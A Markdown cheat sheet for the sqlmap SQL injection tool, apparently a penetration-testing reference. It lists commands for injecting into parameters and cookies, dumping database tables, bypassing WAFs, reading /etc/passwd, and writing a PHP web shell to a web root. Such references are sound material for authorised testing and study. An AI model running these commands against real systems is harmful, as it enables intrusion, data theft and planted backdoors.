# SQLMap Essentials

Automated SQL injection tool. Detects and exploits SQLi in GET/POST parameters, cookies, and HTTP headers.

## Basic Usage

```bash
# GET parameter
sqlmap -u "http://target.com/item?id=1"

# POST parameter
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Cookie injection
sqlmap -u "http://target.com/page" --cookie="id=1"

# From Burp request file
sqlmap -r request.txt

# Specify parameter
sqlmap -u "http://target.com/?id=1&name=test" -p id
```

## Enumeration Flags

```bash
# Get databases
sqlmap -u "http://target.com/?id=1" --dbs

# Get tables from DB
sqlmap -u "http://target.com/?id=1" -D target_db --tables

# Get columns from table
sqlmap -u "http://target.com/?id=1" -D target_db -T users --columns

# Dump table
sqlmap -u "http://target.com/?id=1" -D target_db -T users --dump

# Dump all (careful with large DBs)
sqlmap -u "http://target.com/?id=1" --dump-all
```

## Advanced Options

```bash
# Increase verbosity
sqlmap -u "..." -v 3

# Set DB type (faster)
sqlmap -u "..." --dbms=mysql

# Set risk/level (more aggressive)
sqlmap -u "..." --level=5 --risk=3

# Batch mode (no prompts)
sqlmap -u "..." --batch

# Skip URL encoding
sqlmap -u "..." --no-escape

# Use proxy
sqlmap -u "..." --proxy="http://127.0.0.1:8080"

# WAF bypass — tamper scripts
sqlmap -u "..." --tamper=space2comment,between,randomcase
```

## Shell Access

```bash
# OS shell (if DB user has FILE privilege)
sqlmap -u "..." --os-shell

# SQL shell
sqlmap -u "..." --sql-shell

# Read file
sqlmap -u "..." --file-read="/etc/passwd"

# Write file
sqlmap -u "..." --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```
